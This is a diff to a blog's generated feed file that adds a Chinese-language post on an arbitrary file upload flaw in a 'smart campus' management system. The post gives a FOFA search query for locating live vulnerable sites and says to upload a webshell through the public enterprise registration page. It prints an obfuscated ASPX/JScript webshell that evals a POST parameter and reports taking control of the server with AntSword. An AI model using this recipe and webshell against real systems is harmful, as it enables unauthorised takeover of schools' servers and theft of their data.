@@ -4,6 +4,31 @@
   
     
     <entry>
+      <title>前台任意文件上传漏洞-智慧校园系统</title>
+      <link href="2021/04/14/Smartcampusfileupload%20/"/>
+      <url>2021/04/14/Smartcampusfileupload%20/</url>
+      
+        <content type="html"><![CDATA[<blockquote><p>不是正义会胜利，而是胜利的人即是正义</p></blockquote><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>智慧校园管理系统前台注册页面存在文件上传，由于没有对上传的文件进行审查导致可上传恶意文件控制服务器</p><h2 id="操作过程"><a href="#操作过程" class="headerlink" title="操作过程"></a>操作过程</h2><p>老规矩，fofa采集工具上先对其收集一波</p><blockquote><p>fofa语法：body=”DC_Login/QYSignUp”</p></blockquote><p>找到其中一个疑似可利用的目标站点（带有企业用户注册功能的站点</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2021041564196417.png"></p><p>点击企业用户注册便可发现可对其进行任意文件上传</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/202104156529886.png"></p><p>这里我们上传aspx🐎并且上传后它还能回显对应位置</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2021041569146361466.png"></p><h3 id="附上aspx🐎"><a href="#附上aspx🐎" class="headerlink" title="附上aspx🐎"></a>附上aspx🐎</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ Page Language&#x3D;&quot;Jscript&quot; Debug&#x3D;true%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">var AUXR&#x3D;&#39;DQjiUYyXzAbVMPNsJLrlfRmughGESdKHkpawFTWICnBtoxeZqvOc&#39;;</span><br><span class="line">var OIWN&#x3D;Request.Form(&quot;PleasedaidaiHarvey&quot;);</span><br><span class="line">var JZLF&#x3D;AUXR(4) + AUXR(14) + AUXR(15) + AUXR(9) + AUXR(20) + AUXR(27);</span><br><span class="line">eval(OIWN, JZLF);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>最后蚁剑成功连上</p><h2 id="效果图"><a href="#效果图" class="headerlink" title="效果图"></a>效果图</h2><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/202101154612641264.png"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 笔记 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> CVE </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>通达OA v11.7 在线用户登录漏洞</title>
       <link href="2021/04/14/SSV-99140/"/>
       <url>2021/04/14/SSV-99140/</url>
